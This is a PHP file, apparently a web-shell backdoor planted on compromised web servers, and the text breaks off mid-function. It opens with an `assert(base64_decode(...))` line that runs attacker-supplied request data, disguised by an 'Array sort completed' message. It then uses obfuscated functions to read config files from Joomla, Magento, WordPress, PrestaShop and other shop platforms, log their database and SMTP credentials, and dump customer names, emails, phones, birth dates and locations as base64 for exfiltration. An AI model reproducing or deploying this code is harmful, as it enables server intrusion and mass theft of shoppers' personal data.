<?php

if ( $_REQUEST["array"] )
{

	@assert(base64_decode($_REQUEST["array"]));
	//debug message
	echo "Array sort completed";
	exit();
}


header("Content-Type: text/plain; charset=UTF-8");

$gLog = array();

function wC5Vz($v)
{
    return (int)rntvb($v);
}

function rntvb($v)
{
    if (!isset( $_POST[$v] )) return NULL;
    $v = $_POST[$v];
    return trim($v);
}


function x7Imi($pStr)
{
    global $gLog;
    $gLog []= $pStr;
}


function skqo9($pHost, $pUser, $pPass, $pDB)
{
    $ha = mysql_pconnect($pHost, $pUser, $pPass);
    if ( !$ha ) return NULL;
    if ( !mysql_select_db( $pDB ) )
    {
        x7Imi("DB Fail: cant select db <$pDB>");
        return NULL;
    }
    mysql_set_charset ("utf8", $ha);
    mysql_query ("SET NAMES utf8");
    return $ha;
}

function Eep5t($pHandle)
{
    mysql_close($pHandle);
}


function rP87N($pQuery, $pHA)
{
    $res = mysql_query($pQuery, $pHA);
    if (!$res)
    {
        $es = mysql_error($pHA);
        return array('code' => 0, 'data' => $es);
    }

    if ( mysql_num_rows($res) < 1 ) return array('code' => 0, 'data' => 'no rows');
    $row = mysql_fetch_row($res);
    return array('code' => 1, 'data' => $row);
}


function oXerH(&$pAr)
{
    global $gLog;
    $n = array();

    foreach ($pAr as $k => $v)
    {
        if ($v != '') $n []= "$k#" . base64_encode($v);
    }

    if (count($gLog) > 0) $n []= "log#" . base64_encode( implode('~~~', $gLog) );
    $n = implode('&', $n);
    echo "~~~113~~~$n~~~027~~~";
}

function jIjC2($pPath)
{
    if (!$pPath || $pPath == '') return $pPath;
    $sl = strlen($pPath);
    if ( $pPath[$sl-1] != '/' ) return $pPath . '/';
    return $pPath;
}


function ClzQ7($pBasePath, &$pArRet)
{
    $pBasePath = jIjC2($pBasePath);
    $r = @scandir($pBasePath);
    if ($r === FALSE) return 0;
    $x = 0;
    foreach($r as $sd)
    {
        if ($sd == '.' || $sd == '..') continue;

		$f = $pBasePath . $sd;
		if (@is_link($f) || !@is_dir($f)) continue;
		$f .= '/';
		$pArRet []= $f;
        $x ++;
    }

    return $x;
}


function qx1PV()
{
    $s = $_SERVER['SCRIPT_FILENAME'];
    $p = strrpos($s, chr(0x2F) );
    return $p ? substr($s, 0, $p) . chr(0x2F) : trim(chr(0x20));
}

function FOJpz($pStr)
{
    $p = strrpos($pStr, '/');
    if ($p === FALSE) return '/';
    return substr($pStr, 0, $p+1);
}

function Bs3np($pDir)
{
    $pDir = FOJpz($pDir);
	$p = strrpos($pDir, "/", -2);
	return $p ? substr($pDir, 0, $p) . "/" : "";
}

function zzjOk($pDir)
{
	if (!@is_dir($pDir)) return 0;
	$h = @opendir( $pDir );
	if ($h === FALSE) return 0;
	$sd = @readdir($h);
	closedir($h);
	return $sd !== FALSE;
}


function hvhLI($pDir, $pMaxDepth)
{
	$d = 0;
	$cur = $pDir;
	while($d < $pMaxDepth)
	{
		$try = Bs3np($cur);
		if ($try == ''  ||  !zzjOk($try)) break;
		$d ++;
		$cur = $try;
	}
	return $cur;
}




function qAX5r($pStr)
{
    $pStr = preg_replace("~#[^\r\n]*~", '', $pStr);

    while(1)
    {
        $sl = strlen($pStr);
        $st = -1;
        for ($x = 0; $x < $sl-2; $x ++ )
        {
            if (substr($pStr, $x, 2) == ("/" . "*") )
            {
                $st = $x;
                break;
            }
        }

        if ($st == -1) break;
        $en = -1;
        for ($x = $st+2; $x < $sl-2; $x ++ )
        {
            if (substr($pStr, $x, 2) == ("*" . "/"))
            {
                $en = $x;
                break;
            }
        }

        if ($en == -1) break;
        $pStr = substr($pStr, 0, $st) . substr($pStr, $en + 2);
    }


    return $pStr;
}


function efXuy($pSrc)
{
    return preg_replace('#^\s*//.+$#m', "", $pSrc);
}

function TU4v9($pSrc)
{
    $pSrc = qAX5r($pSrc);
    $pSrc = efXuy($pSrc);
    return $pSrc;
}

function ev9Xh($pStr)
{
    if (!$pStr || $pStr == '') return '';
    $pStr = str_replace("'", "", $pStr);
    $pStr = str_replace('"', "", $pStr);
    return trim($pStr);
}

function hLEME($pSrc, $pStartPos, $pMarkA, $pMarkB)
{
    $p0 = strpos($pSrc, $pMarkA, $pStartPos);
    if ($p0 === FALSE) return '';
    $p0 += strlen($pMarkA);
    $p1 = strpos($pSrc, $pMarkB, $p0);
    if ($p1 === FALSE) return '';
    return trim( substr($pSrc, $p0, $p1-$p0) );
}


function ImOkq(&$pAr, $pStr)
{
    for ($x = 0; $x < count($pAr); $x ++ )
    {
        if ($pAr[$x][0] == $pStr) return $pAr[$x][1];
    }
    return NULL;
}

function W4mSb($pStr, $pOff, $pVariants)
{
    $l = strlen($pStr);
    while (1)
    {
        if ($pOff >= $l) break;
        $c = $pStr[$pOff];
        if ($c == ' ' || $c == "\n" || $c == "\t" || $c == "\r")
        {
            $pOff ++;
            continue;
        }
        if (strpos($pVariants, $c) !== FALSE) return $pOff;
        return -1;
    }

    return -1;
}

function fQiFq($pSrc)
{
    $p0 = strpos($pSrc, '$table_prefix');
    if ($p0 === FALSE) return NULL;
    $p0 += 13;
    $p1 = strpos($pSrc, ';', $p0);
    if ($p1 === FALSE) return NULL;
    $part = substr($pSrc, $p0, $p1 - $p0);
    $part = ev9Xh($part);
    $part = str_replace("=", "", $part);
    $part = trim($part);
    return $part;
}



function PxV21($pStr)
{
    $off = 0;
    $ar = array();
    while (1)
    {
        $r = UUaQO($pStr, $off);
        if ($r === NULL) break;
        $off = $r[2];
        if ($r[0] != '' && $r[1] != '') $ar []= array($r[0], $r[1]);
    }
    return $ar;
}



function UUaQO($pStr, $pOff)
{
    $off = $pOff;
    $p = strpos($pStr, 'define', $off);
    if ($p === FALSE) return NULL;
    $off = $p + 6;
    $p = W4mSb($pStr, $off, "(");
    if ($p == -1) return array('', '', $off);
    $off = $p + 1;
    $q1 = W4mSb($pStr, $off, "'\"");
    if ($q1 == -1) return array('', '', $off);
    $qc = $pStr[$q1];
    $q1 ++;
    $off = $q1;
    $q2 = strpos($pStr, $qc, $off);
    if ($q2 === FALSE) return array('', '', $off);
    $v_key = substr($pStr, $q1, $q2-$q1);
    $off = $q2 + 1;
    $p = W4mSb($pStr, $off, ',');
    $off = $p + 1;
    $q1 = W4mSb($pStr, $off, "'\"");
    if ($q1 == -1) return array('', '', $off);
    $qc = $pStr[$q1];
    $q1 ++;
    $off = $q1;
    $q2 = strpos($pStr, $qc, $off);
    if ($q2 === FALSE) return array('', '', $off);
    $off = $q2 + 1;
    $p = W4mSb($pStr, $off, ")");
    if ($p == -1) return array('', '', $off);
    $off = $p + 1;
    $p = W4mSb($pStr, $off, ";");
    if ($p == -1) return array('', '', $off);
    $off = $p + 1;
    $v_val = substr($pStr, $q1, $q2-$q1);
    return array($v_key, $v_val, $off);
}



function C1eEc($pSrc, $pName)
{
    $p0 = strpos($pSrc, $pName, 0);
    if ($p0 === FALSE) return '';
    $p2 = strpos($pSrc, ';', $p0 + 1);
    if ($p2 === FALSE) return '';
    $p1 = strpos($pSrc, '=', $p0 + 1);
    if ($p1 === FALSE) return '';
    if ($p1 > $p2) return '';
    return ev9Xh( substr($pSrc, $p1 + 1, $p2 - $p1 - 1) );
}



function Sk5qH($pStr, $pParamName)
{
    $start = 0;
    $var_str = '$' . $pParamName;

    while (1)
    {
        $p0 = strpos($pStr, $var_str, $start);
        if ($p0 === FALSE) return '';
        $p2 = strpos($pStr, ';', $p0 + 1);
        if ($p2 === FALSE) return '';
        $p1 = strpos($pStr, '=', $p0 + 1);
        if ($p1 === FALSE) return '';
        if ($p1 > $p2) return '';
        if (trim( substr($pStr, $p0, $p1 - $p0) ) != $var_str)
        {
            $start = $p2+1;
            continue;
        }
        $p1 ++;
        $has_comment = 0;
        for ($x = $p0; $x > 2; $x -- )
        {
            if ($pStr[$x] == "\n") break;
            if ($pStr[$x] == '/' && $pStr[$x-1] == '/') $has_comment = 1;
        }
        if (!$has_comment) break;
        $start = $p2+1;
    }

    return ev9Xh( substr($pStr, $p1, $p2 - $p1) );
}

function jEd6X($pRootDir)
{
    $fd_cfg = file_get_contents( $pRootDir. 'configuration.php' );
    if (!$fd_cfg)
    {
        x7Imi("cant open joomla cfg @ $pRootDir");
        return NULL;
    }

    $v_db_name      = Sk5qH($fd_cfg, 'db');
    $v_db_host      = Sk5qH($fd_cfg, 'host');
    $v_db_user      = Sk5qH($fd_cfg, 'user');
    $v_db_pass      = Sk5qH($fd_cfg, 'password');
    $v_prefix       = Sk5qH($fd_cfg, 'dbprefix');
    $v_url          = Sk5qH($fd_cfg, 'live_site');

    return array( 'db_name'   => $v_db_name,
                  'db_user'   => $v_db_user,
                  'db_pass'   => $v_db_pass,
                  'db_host'   => $v_db_host,
                  'db_prefix' => $v_prefix,
                  'url'       => $v_url,
                  'smtp_port' => Sk5qH($fd_cfg, 'smtpport'),
                  'smtp_user' => Sk5qH($fd_cfg, 'smtpuser'),
                  'smtp_pass' => Sk5qH($fd_cfg, 'smtppass'),
                  'smtp_host' => Sk5qH($fd_cfg, 'smtphost'),
                  'smtp_mail' => Sk5qH($fd_cfg, 'mailfrom')
                  );
}

function I8hWq($pRootDir)
{
    $f = $pRootDir . 'app/etc/local.xml';

    $fd = file_get_contents($f);
    if (!$fd)
    {
        x7Imi("Cant load MAGENTO config: $f");
        return NULL;
    }

    $v_db_host    = hLEME($fd, 0, '<host><![CDATA[',          ']]></host>');
    $v_db_user    = hLEME($fd, 0, '<username><![CDATA[',      ']]></username>');
    $v_db_pass    = hLEME($fd, 0, '<password><![CDATA[',      ']]></password>');
    $v_db_name    = hLEME($fd, 0, '<dbname><![CDATA[',        ']]></dbname>');
    $v_prefix     = hLEME($fd, 0, '<table_prefix><![CDATA[',  ']]></table_prefix>');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix);
}

function weh2j($pRootDir)
{
    $f = $pRootDir . 'config.php';
    $fd_cfg = file_get_contents( $f );
    if (!$fd_cfg)
    {
        x7Imi("cant open OPEN-CART config: $f");
        return NULL;
    }

    $def                = PxV21($fd_cfg);
    $v_db_host          = ImOkq($def, 'DB_HOSTNAME');
    $v_db_user          = ImOkq($def, 'DB_USERNAME');
    $v_db_pass          = ImOkq($def, 'DB_PASSWORD');
    $v_db_name          = ImOkq($def, 'DB_DATABASE');
    $v_prefix           = ImOkq($def, 'DB_PREFIX');
    $v_url              = ImOkq($def, 'HTTP_SERVER');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix, 'url' => $v_url);
}

function fQmg7($pRootDir)
{
    $fd_cfg = file_get_contents( $pRootDir . 'includes/configure.php' );
    if (!$fd_cfg)
    {
        x7Imi('cant open ZEN-CART config !');
        return NULL;
    }

    $def                = PxV21($fd_cfg);
    $v_db_host          = ImOkq($def, 'DB_SERVER');
    $v_db_user          = ImOkq($def, 'DB_SERVER_USERNAME');
    $v_db_pass          = ImOkq($def, 'DB_SERVER_PASSWORD');
    $v_db_name          = ImOkq($def, 'DB_DATABASE');
    $v_prefix           = ImOkq($def, 'DB_PREFIX');
    $v_url              = ImOkq($def, 'HTTP_SERVER');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix, 'url' => $v_url);
}

function Yo9Gz($pRootDir)
{
    $fd = file_get_contents( $pRootDir . 'config.local.php' );
    if (!$fd)
    {
        x7Imi('cs cart.. cant load cfg !');
        return NULL;
    }

    $fd = TU4v9($fd);

    $v_db_host          = C1eEc($fd, 'db_host');
    $v_db_user          = C1eEc($fd, 'db_user');
    $v_db_pass          = C1eEc($fd, 'db_password');
    $v_db_name          = C1eEc($fd, 'db_name');
    $v_prefix           = C1eEc($fd, 'table_prefix');
    $v_url              = C1eEc($fd, 'http_host');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix, 'url' => $v_url);
}


function W7QZw($pRootDir)
{
    $fd_cfg = file_get_contents( $pRootDir . 'includes/configure.php' );
    if (!$fd_cfg)
    {
        x7Imi('os-comm.. cant load config');
        return NULL;
    }

    $def_cfg            = PxV21($fd_cfg);
    $v_db_host          = ImOkq($def_cfg, 'DB_SERVER');
    $v_db_user          = ImOkq($def_cfg, 'DB_SERVER_USERNAME');
    $v_db_pass          = ImOkq($def_cfg, 'DB_SERVER_PASSWORD');
    $v_db_name          = ImOkq($def_cfg, 'DB_DATABASE');
    $v_url              = ImOkq($def_cfg, 'HTTP_SERVER');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix, 'url' => $v_url);
}

function LBwW3($pRootDir)
{
    $fd_cfg = file_get_contents( $pRootDir . 'wp-config.php' );
    if (!$fd_cfg)
    {
        x7Imi("cant load wp cfg @ $pRootDir");
        return NULL;
    }

    $def          = PxV21($fd_cfg);
    $v_db_name    = ImOkq($def, 'DB_NAME');
    $v_db_user    = ImOkq($def, 'DB_USER');
    $v_db_host    = ImOkq($def, 'DB_HOST');
    $v_db_pass    = ImOkq($def, 'DB_PASSWORD');
    $v_prefix     = fQiFq($fd_cfg);
    if (!$v_prefix) return NULL;

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix);
}

function uZIgK($pRootDir)
{
    $fd_cfg = file_get_contents( $pRootDir . 'config/settings.inc.php' );
    if (!$fd_cfg)
    {
        x7Imi('cant open PRESTA config !');
        return NULL;
    }

    $def            = PxV21($fd_cfg);
    $v_db_host      = ImOkq($def, '_DB_SERVER_');
    $v_db_user      = ImOkq($def, '_DB_USER_');
    $v_db_pass      = ImOkq($def, '_DB_PASSWD_');
    $v_db_name      = ImOkq($def, '_DB_NAME_');
    $v_prefix       = ImOkq($def, '_DB_PREFIX_');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix);
}

function EqwV1($pRootDir)
{
    $fd = file_get_contents( $pRootDir . 'config/config.php' );
    if (!$fd)
    {
        x7Imi('interspire.. cant load config !');
        return NULL;
    }

    $fd = TU4v9($fd);

    $v_db_host          = C1eEc($fd, 'dbServer');
    $v_db_user          = C1eEc($fd, 'dbUser');
    $v_db_pass          = C1eEc($fd, 'dbPass');
    $v_db_name          = C1eEc($fd, 'dbDatabase');
    $v_prefix           = C1eEc($fd, 'tablePrefix');
    $v_url              = C1eEc($fd, 'ShopPath');

    return array( 'db_name' => $v_db_name, 'db_user' => $v_db_user, 'db_pass' => $v_db_pass, 'db_host' => $v_db_host, 'db_prefix' => $v_prefix, 'url' => $v_url);
}




function Opqar($pType, $pDir, $pRowFirst, $pRowNum)
{
    $ret = array('code' => '0');

    if ($pType == 200)
    {
        $cfg = jEd6X($pDir);
        if (!$cfg) return $ret;

        $ta_ord         = $cfg['db_prefix'] . 'virtuemart_order_userinfos';
        $ta_cnt         = $cfg['db_prefix'] . 'virtuemart_countries';
        $ta_sta         = $cfg['db_prefix'] . 'virtuemart_states';

        $query_total    = "SELECT COUNT(*) FROM `$ta_ord` LIMIT 0, 1";

        $query = "
SELECT oror.first_name, oror.last_name, oror.email, oror.phone_1, oror.company, oror.city, 
(CASE WHEN coco.country_2_code IS NULL THEN '' ELSE coco.country_2_code  END) AS country, 
(CASE WHEN stst.state_2_code   IS NULL THEN '' ELSE stst.state_2_code    END) AS state,
(CASE WHEN oror.title          IS NULL THEN '' ELSE oror.title           END) AS t
FROM `$ta_ord` AS oror 
LEFT OUTER JOIN `$ta_cnt`  AS coco ON coco.virtuemart_country_id=oror.virtuemart_country_id  
LEFT OUTER JOIN `$ta_sta`  AS stst ON stst.virtuemart_state_id=oror.virtuemart_state_id 
GROUP BY oror.email
ORDER BY oror.email ASC 
LIMIT $pRowFirst, $pRowNum
";
    }
    else if ($pType == 201)
    {
        x7Imi("inside magento !");

        $cfg = I8hWq($pDir);
        if (!$cfg) return $ret;

        $tbl_ord        = $cfg['db_prefix'] . 'sales_flat_order_address';

        $query_total    = "SELECT COUNT(*) FROM `$tbl_ord` LIMIT 0, 1";

        $query = "
SELECT ord.firstname, ord.lastname, ord.email, ord.telephone,
ord.company, ord.city, ord.country_id, ord.region 
FROM `$tbl_ord` AS ord 
GROUP BY ord.email 
ORDER BY ord.email ASC 
LIMIT $pRowFirst, $pRowNum  
";
    }
    else if ($pType == 202)
    {
        $cfg = weh2j($pDir);
        if (!$cfg) return $ret;

        $tbl_customer   = $cfg['db_prefix'] . 'customer';
        $tbl_country    = $cfg['db_prefix'] . 'country';
        $tbl_address    = $cfg['db_prefix'] . 'address';

        $query_total    = "SELECT COUNT(*) FROM `$tbl_customer` LIMIT 0, 1";

        $query = "
SELECT `$tbl_customer`.`firstname`,
`$tbl_customer`.`lastname`,
`$tbl_customer`.`email`,
`$tbl_customer`.`telephone`,
`$tbl_address`.`company`,
`$tbl_address`.`city`,
`$tbl_country`.`name` AS 'country_name'
FROM `$tbl_customer`, `$tbl_address`, `$tbl_country`
WHERE `$tbl_customer`.`customer_id`=`$tbl_address`.`customer_id` AND `$tbl_country`.`country_id`=`$tbl_address`.`country_id` 
ORDER BY `$tbl_customer`.`customer_id` ASC
LIMIT $pRowFirst, $pRowNum
        ";
    }
    else if ($pType == 203)
    {
        $cfg = jEd6X( $pDir );
        if (!$cfg) return $ret;

        $ta_ord         = $cfg['db_prefix'] . 'mijoshop_order';
        $ta_cnt         = $cfg['db_prefix'] . 'mijoshop_country';

        $query_total    = "SELECT COUNT(*) FROM `$ta_ord` LIMIT 0, 1";

        $query = "
SELECT ooo.firstname, ooo.lastname, ooo.email, ooo.telephone, 
(CASE WHEN ooo.shipping_company IS NULL THEN '' ELSE ooo.shipping_company END) AS comp, 
ooo.payment_city, 
coco.iso_code_2 
FROM `$ta_ord` AS ooo 
LEFT OUTER JOIN `$ta_cnt` AS coco ON coco.country_id=ooo.payment_country_id  
GROUP BY `email`  
ORDER BY `email` ASC   
LIMIT $pRowFirst, $pRowNum   
";
    }
    else if ($pType == 204)
    {
        $cfg = fQmg7($pDir);
        if (!$cfg) return $ret;

        $tbl_customers  = $cfg['db_prefix'] . 'customers';
        $tbl_countries  = $cfg['db_prefix'] . 'countries';
        $tbl_adr_book   = $cfg['db_prefix'] . 'address_book';

        $query_total    = "SELECT COUNT(*) FROM `$tbl_customers` LIMIT 0, 1";

        $query = "
SELECT cc.customers_firstname, cc.customers_lastname, 
cc.customers_email_address, cc.customers_telephone, 
ab.entry_company, ab.entry_city, co.countries_iso_code_2, ab.entry_state, cc.customers_gender, cc.customers_dob
FROM $tbl_customers AS cc, $tbl_adr_book AS ab, $tbl_countries AS co 
WHERE cc.customers_id=ab.customers_id  AND  co.countries_id=ab.entry_country_id 
ORDER BY cc.customers_id ASC 
LIMIT $pRowFirst, $pRowNum 
        ";
    }
    else if ($pType == 205)
    {
        $cfg = LBwW3($pDir);
        if (!$cfg) return $ret;

        $tbl_usermeta   = $cfg['db_prefix'] . 'usermeta';

        $query_total    = "SELECT COUNT(DISTINCT `user_id`) FROM `wpr_usermeta`  LIMIT 0, 1";

        $query = "
SELECT 
MAX(CASE WHEN um.meta_key = 'billing_first_name'  THEN um.meta_value ELSE '' END) AS fn,
MAX(CASE WHEN um.meta_key = 'billing_last_name'   THEN um.meta_value ELSE '' END) AS ln,
MAX(CASE WHEN um.meta_key = 'billing_phone'       THEN um.meta_value ELSE '' END) AS phone,
MAX(CASE WHEN um.meta_key = 'billing_city'        THEN um.meta_value ELSE '' END) AS city,
MAX(CASE WHEN um.meta_key = 'billing_company'     THEN um.meta_value ELSE '' END) AS company,
MAX(CASE WHEN um.meta_key = 'billing_email'       THEN um.meta_value ELSE '' END) AS email,
MAX(CASE WHEN um.meta_key = 'billing_country'     THEN um.meta_value ELSE '' END) AS country,
MAX(CASE WHEN um.meta_key = 'billing_state'       THEN um.meta_value ELSE '' END) AS state,
um.user_id
FROM `$tbl_usermeta` AS um
GROUP BY um.user_id
ORDER BY um.user_id ASC
LIMIT $pRowFirst, $pRowNum
        ";

    }
    else if ($pType == 206)
    {
        $cfg = uZIgK($pDir);
        if (!$cfg) return $ret;

        $tbl_customer = $cfg['db_prefix'] . 'customer';
        $tbl_address  = $cfg['db_prefix'] . 'address';
        $tbl_country  = $cfg['db_prefix'] . 'country';

        $query_total    = "SELECT COUNT(*) FROM `$tbl_customer` LIMIT 0, 1";

        $query = "
SELECT cu.firstname, cu.lastname, cu.email,
(CASE WHEN ad.phone      IS NULL THEN '' ELSE ad.phone      END) AS phone, 
(CASE WHEN ad.company    IS NULL THEN '' ELSE ad.company    END) AS company, 
(CASE WHEN ad.city       IS NULL THEN '' ELSE ad.city       END) AS city, 
(CASE WHEN co.iso_code   IS NULL THEN '' ELSE co.iso_code   END) AS iso_code,
cu.id_gender, cu.birthday, cu.id_customer
FROM `$tbl_customer` AS cu 
LEFT OUTER JOIN `$tbl_address` AS ad ON ad.id_customer=cu.id_customer 
LEFT OUTER JOIN `$tbl_country` AS co ON ad.id_country=co.id_country 
GROUP BY cu.id_customer 
ORDER BY cu.id_customer ASC 
LIMIT $pRowFirst, $pRowNum  
";
    }
    else if ($pType == 207)
    {
        $cfg = EqwV1($pDir);
        if (!$cfg) return $ret;

        $tbl_ord        = $cfg['db_prefix'] . 'orders';

        $query_total    = "SELECT COUNT(DISTINCT `ordcustid` ) FROM `$tbl_ord` LIMIT 0, 1";

        $query = "
SELECT ord.ordbillfirstname, ord.ordbilllastname, ord.ordbillemail, ord.ordbillphone,
ord.ordbillcompany, ord.ordbillsuburb,
ord.ordbillcountrycode, ord.ordbillstate
FROM `$tbl_ord` AS ord 
GROUP BY ord.ordcustid 
ORDER BY ord.ordcustid ASC 
LIMIT $pRowFirst, $pRowNum   
        ";
    }
    else if ($pType == 208)
    {
        $cfg = Yo9Gz($pDir);
        if (!$cfg) return $ret;

        $tbl_orders = $cfg['db_prefix'] . 'orders';
        $tbl_users  = $cfg['db_prefix'] . 'users';

        $query_total    = "SELECT COUNT(DISTINCT `user_id` ) FROM `$tbl_orders` LIMIT 0, 1";

        $query = "
SELECT ord.b_firstname, ord.b_lastname, us.email, ord.b_phone, ord.company, ord.b_city, ord.b_country, ord.b_state, ord.b_title
FROM `$tbl_users` AS us
LEFT OUTER JOIN `$tbl_orders` AS ord ON ord.user_id=us.user_id
GROUP BY us.user_id 
ORDER BY ord.user_id ASC 
LIMIT $pRowFirst, $pRowNum   
        
        ";
    }
    else if ($pType == 209)
    {
        x7Imi("inside OS COMMERCE !!!!!!");

        $cfg = W7QZw($pDir);
        if (!$cfg) return $ret;


        $fd_tbl = file_get_contents( $pDir . 'includes/database_tables.php' );
        if (!$fd_tbl)
        {
            x7Imi('os-comm.. cant load table-config');
            return $ret;
        }

        $def_tbl            = PxV21($fd_tbl);
        $tbl_ad             = ImOkq($def_tbl, 'TABLE_ADDRESS_BOOK');
        $tbl_cu             = ImOkq($def_tbl, 'TABLE_CUSTOMERS');
        $tbl_zo             = ImOkq($def_tbl, 'TABLE_ZONES');
        $tbl_co             = ImOkq($def_tbl, 'TABLE_COUNTRIES');

        $query_total    = "SELECT COUNT(`customers_id`) FROM `$tbl_cu` LIMIT 0, 1";

        $query = "
SELECT cu.customers_firstname, cu.customers_lastname, cu.customers_email_address,
cu.customers_telephone, ad.entry_company, ad.entry_city, co.countries_iso_code_2,
zo.zone_code, cu.customers_gender, cu.customers_dob 
FROM `$tbl_cu` AS cu 
LEFT OUTER JOIN `$tbl_ad`  AS  ad  ON cu.customers_id=ad.customers_id 
LEFT OUTER JOIN `$tbl_co`  AS  co  ON ad.entry_country_id=co.countries_id 
LEFT OUTER JOIN `$tbl_zo`  AS  zo  ON ad.entry_zone_id=zo.zone_id
GROUP BY cu.customers_id
ORDER BY cu.customers_id ASC 
LIMIT $pRowFirst, $pRowNum   
        ";
    }
    else return $ret;




    if ( !$cfg['db_host'] ||  !$cfg['db_user']  ||  !$cfg['db_pass']  ||  !$cfg['db_name'] )
    {
        x7Imi("missing one of DB-access paramz ($pType)");
        return $ret;
    }

    $ha = skqo9( $cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name'] );
    if (!$ha)
    {
        x7Imi('db connect fail');
        return $ret;
    }





    if ($pRowFirst == 0)
    {
        x7Imi( sprintf("db config shit:  HOST: %s  USER: %s  PASS: %s  DB: %s  PREFIX: %s", $cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name'], $cfg['db_prefix']) );

        $res = rP87N($query_total, $ha);
        if ($res['code'] == 0)
        {
            x7Imi("cant get TOTAL ROWS... db error: " . $res['data']);
            Eep5t($ha);
            return $ret;
        }
        else
        {
            $tot_rows = (int)$res['data'][0];
            x7Imi( "TOTAL ROWS: $tot_rows");
            if ($tot_rows < 1)
            {
                x7Imi("not enough db rows !");
                Eep5t($ha);
                return $ret;
            }
        }
    }






    $res = mysql_query($query, $ha);
    if (!$res)
    {
        $es = mysql_error($ha);
        x7Imi('db query fail: ' . $es);
        Eep5t($ha);
        return $ret;
    }

    $nr = mysql_num_rows($res);
    if ($nr < 1)
    {
        Eep5t($ha);
        return $ret;
    }



    $juice = '';
    $num_wr = 0;
    for ($x = 0; $x < $nr; $x ++ )
    {
        $row = mysql_fetch_row($res);
        $this_line = '';

        if ($pType == 200)
        {
            $t_gender = '0';
            if      ($row[8] == 'Mr' ) $t_gender = '1';
            else if ($row[8] == 'Mrs') $t_gender = '2';
            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], $row[7], $t_gender, '' );
        }
        else if ($pType == 201)
        {
            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], $row[7], '', '' );
        }
        else if ($pType == 202)
        {
            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], '', '', '' );
        }
        else if ($pType == 203)
        {
            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], '', '', '' );
        }
        else if ($pType == 204)
        {
            if      ($row[8] == 'm') $t_gender = '1';
            else if ($row[8] == 'f') $t_gender = '2';
            else                     $t_gender = '0';

            $t_dob = strtok($row[9], " \n\t");
            if ($t_dob === FALSE) $t_dob = '';

            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], $row[7], $t_gender, $t_dob );
        }
        else if ($pType == 205)
        {
            $this_line = IZOcA( $row[0], $row[1], $row[5], $row[2], $row[4], $row[3], $row[6], $row[7], '', '' );
        }
        else if ($pType == 206)
        {
            if      ($row[7] == '2') $t_gender = '2';
            else if ($row[7] == '1') $t_gender = '1';
            else                     $t_gender = '0';

            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], '', $t_gender, $row[8] );
        }
        else if ($pType == 207)
        {
            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], $row[7], '', '');
        }
        else if ($pType == 208)
        {
            $this_line = IZOcA( $row[0], $row[1], $row[2],  $row[3], $row[4], $row[5], $row[6], $row[7], $row[8], '' );
        }
        else if ($pType == 209)
        {
            $t_gender = '0';
            $t_dob = strtok($row[9], " \n\t");
            if ($t_dob === FALSE) $t_dob = '';

            if      ($row[8] == 'm') $t_gender = '1';
            else if ($row[8] == 'f') $t_gender = '2';

            $this_line = IZOcA( $row[0], $row[1], $row[2], $row[3], $row[4], $row[5], $row[6], $row[7], $t_gender, $t_dob );
        }

        if ($this_line == '')
        {
            x7Imi("got empty row !");
            continue;
        }

        if ($num_wr > 0) $juice .= '^^';
        $juice .= $this_line;

        $num_wr ++;
    }


    Eep5t($ha);


    if ($nr < $pRowNum) $next_row_index = -1;
    else                $next_row_index = $pRowFirst + $nr;

    $ret['code']   = '1';
    $ret['next']   = $next_row_index;
    $ret['result'] = $juice;

    return $ret;
}


function IZOcA($pFirstName, $pLastName, $pEMAIL, $pTel, $pComp, $pCity, $pCountry, $pState, $pGender, $pDOB)
{
    if ($pFirstName == '' && $pLastName == '' && $pEMAIL == '' && $pTel == '') return '';

    if ($pGender == '') $pGender    = '0';
    if ($pDOB == '')    $pDOB       = '0001-01-01';

    return base64_encode( sprintf("%s,%s,%s,%s,%s,%s,%s,%s,%s,%s",
                base64_encode($pFirstName),
                base64_encode($pLastName),
                base64_encode($pEMAIL),
                base64_encode($pTel),
                base64_encode($pComp),
                base64_encode($pCity),
                base64_encode($pCountry),
                base64_encode($pState),
                base64_encode($pGender),
                base64_encode($pDOB) ) );
}


function L6Bxc($pFN)
{
    $p = strrpos($pFN, '.');
    if ($p === false) return '';
    return strtolower( substr($pFN, $p + 1) );
}



function BGFfH($pFN, &$pArExt)
{
    $fext = L6Bxc($pFN);
    foreach ($pArExt as $e)
    {
        if ($fext == $e) return 1;
    }
    return 0;
}


function M5AO8($dir='.')
{
    if (!is_dir($dir)) return false;
    $files = array();
    M5AO8AUX($dir, $files);
    return $files;
}

function M5AO8AUX($dir, &$files)
{
    $handle = opendir($dir);
    while (($file = readdir($handle)) !== false)
    {
        if ($file == '.' || $file == '..') continue;
        $filepath = $dir == '.' ? $file : $dir . '/' . $file;
        if (is_link($filepath))  continue;
        if (is_file($filepath)) $files[] = $filepath;
        else if (is_dir($filepath)) M5AO8AUX($filepath, $files);
    }
    closedir($handle);
}




function jGwnk($pFileNameZIP, $pDirToZIP, $pFileNameBaseInZIP, $pFilterStr)
